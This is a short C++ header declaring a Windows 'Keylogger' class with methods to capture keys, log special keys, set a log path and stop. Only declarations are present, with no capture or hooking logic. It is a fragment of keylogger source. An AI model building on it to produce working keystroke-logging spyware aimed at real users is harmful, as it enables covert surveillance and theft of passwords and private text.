#ifndef KEYLOGGER_HPP
#define KEYLOGGER_HPP

#include <Windows.h>
#include <string>
#include <stdlib.h>
#include <stdio.h>
#include <iostream>
#include <fstream>
#include <chrono>
#include <atomic>
#include <filesystem>

class Keylogger {
public:
    Keylogger(const std::string& filename) : logFilename(filename), running(false) {}

    void captureKey();
    void setPath(const std::string &filePath);
    void stop();

private:
    std::string logFilename;
    std::atomic<bool> running;

    void log(const std::string& input);
    bool logSpecialKey(int key);
    void logKey(char key) { log(std::string(1, key)); }
};

#endif